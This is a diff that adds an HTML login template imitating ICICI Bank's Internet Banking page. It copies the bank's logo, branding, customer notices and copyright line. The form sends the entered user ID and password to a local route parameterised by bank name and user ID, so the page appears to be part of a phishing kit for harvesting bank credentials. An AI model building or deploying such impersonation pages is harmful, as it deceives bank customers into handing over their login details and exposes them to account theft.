@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+  <meta charset="utf-8">
+  <title>Log in to Internet Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" type="image/x-icon" href="/favicon.ico">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    body { font-family: 'Mulish', sans-serif; }
+  </style>
+</head>
+<body class="bg-gray-50">
+<!-- Header -->
+<header class="bg-gradient-to-b from-[#BE2A2A] to-[#EF7F1A] backdrop-blur-md py-4 px-4 md:px-8">
+  <div class="max-w-7xl mx-auto flex justify-between items-center">
+    <div class="flex items-center">
+      <div class="ml-4 md:ml-8">
+        <img th:src="@{/icici/image.png}"   alt="ICICI Bank Logo" class="h-8 md:h-10">
+      </div>
+    </div>
+    <div class="flex space-x-2 md:space-x-4">
+      <button class="flex items-center bg-[#feeee5] border border-[#fee3d4] rounded-full text-xs md:text-sm font-bold text-[#63666f] px-3 py-2 transition-all hover:bg-[#e1e5f2] hover:border-[#b7bdd2]">
+        Personal Banking
+      </button>
+    </div>
+  </div>
+</header>
+
+<!-- Main Content -->
+<main class="min-h-screen flex flex-col items-center justify-center py-8 px-4">
+  <!-- Login Form -->
+  <div class="w-full max-w-3xl bg-white rounded-xl shadow-lg p-6 mb-8">
+    <h2 class="text-2xl font-bold text-center text-[#414141] mb-4">Log in to Internet Banking</h2>
+
+    <!-- Alerts -->
+    <div th:if="${error}" class="mb-4 rounded-lg border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700" role="alert" th:text="${error}"></div>
+    <div th:if="${message}" class="mb-4 rounded-lg border border-green-200 bg-green-50 px-4 py-3 text-sm text-green-700" role="status" th:text="${message}"></div>
+
+    <form name="iciciLoginForm" class="space-y-6" method="post" autocomplete="off"
+          th:action="@{/bank/login/{bankName}/{userId}(bankName=${bankName}, userId=${userId})}">
+      <!-- User ID Field -->
+      <div>
+        <div class="mb-2">
+          <label for="userName" class="block text-xs font-semibold mb-1 text-[#414141] uppercase tracking-wide">User ID *</label>
+          <input id="userName" name="userName" type="text" placeholder="Enter User ID" autocomplete="off" required
+                 class="w-full px-4 py-3 border border-[#CAD9F2] rounded-lg focus:outline-none focus:border-[#4A87E2] text-[#414141]" />
+        </div>
+        <p class="text-xs text-[#616571]">Enter your Internet Banking User ID</p>
+      </div>
+
+      <!-- Password Field -->
+      <div>
+        <div class="mb-2">
+          <label for="password" class="block text-xs font-semibold mb-1 text-[#414141] uppercase tracking-wide">Password *</label>
+          <input id="password" name="password" type="password" placeholder="Enter Password" required minlength="6" autocomplete="off"
+                 class="w-full px-4 py-3 border border-[#CAD9F2] rounded-lg focus:outline-none focus:border-[#4A87E2] text-[#414141]" />
+        </div>
+        <p class="text-xs text-[#616571]">Enter your Internet Banking Password</p>
+      </div>
+
+      <!-- Login Button -->
+      <button type="submit"
+              class="w-full bg-[#900] text-white font-semibold py-3 rounded-lg hover:bg-[#7a0000] transition-colors">
+        LOG IN
+      </button>
+
+      <!-- Forgot Password Link -->
+      <div class="text-center">
+        <a href="#" class="text-sm text-[#e77718] hover:underline">Forgot User ID / Password?</a>
+      </div>
+    </form>
+  </div>
+
+  <!-- Important Notice Card -->
+  <div class="w-full max-w-3xl bg-white rounded-xl shadow-lg p-6">
+    <div class="flex items-center mb-6">
+      <div class="mr-3">
+        <!-- Important Notice Icon -->
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#F0792E"/>
+        </svg>
+      </div>
+      <p class="text-lg font-bold text-[#414141]">Important notice</p>
+    </div>
+
+    <div class="space-y-4">
+      <!-- Notice Items -->
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">Due to a scheduled maintenance activity, you will be unable to log in and transact through Retail Net Banking on Nov 09, 2025 from 03:00 a.m. to 03:10 a.m. IST. Apologies for the inconvenience.</p>
+      </div>
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">Due to a scheduled maintenance activity, you will be unable to perform transactions through the iMobile app on Nov 09, 2025 from 03:00 a.m. to 03:10 a.m. IST. We apologise for the inconvenience.</p>
+      </div>
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">The new toll-free number to call our Personal Banking Customer Care: 1800 1080.</p>
+      </div>
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">CAPTCHA has been introduced for login to ensure a safer banking experience.</p>
+      </div>
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">Update Internet Explorer or use a modern browser for a seamless experience.</p>
+      </div>
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">New registrations on iMobile Pay are not available on select Honor and Huawei devices.</p>
+      </div>
+      <div class="flex items-start">
+        <span class="flex-shrink-0 mt-1 mr-3">
+          <svg width="8" height="8" viewBox="0 0 8 8" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="4" cy="4" r="3" fill="#F0792E"/></svg>
+        </span>
+        <p class="text-sm text-[#616571]">Upgrade to Android 8.0+ or iOS 17+ for the best mobile banking experience.</p>
+      </div>
+    </div>
+  </div>
+</main>
+
+<!-- Footer -->
+<footer class="py-4 text-center text-xs text-[#616571]">
+  <p>© 2025 ICICI Bank Ltd. All Rights Reserved.</p>
+</footer>
+</body>
+</html>
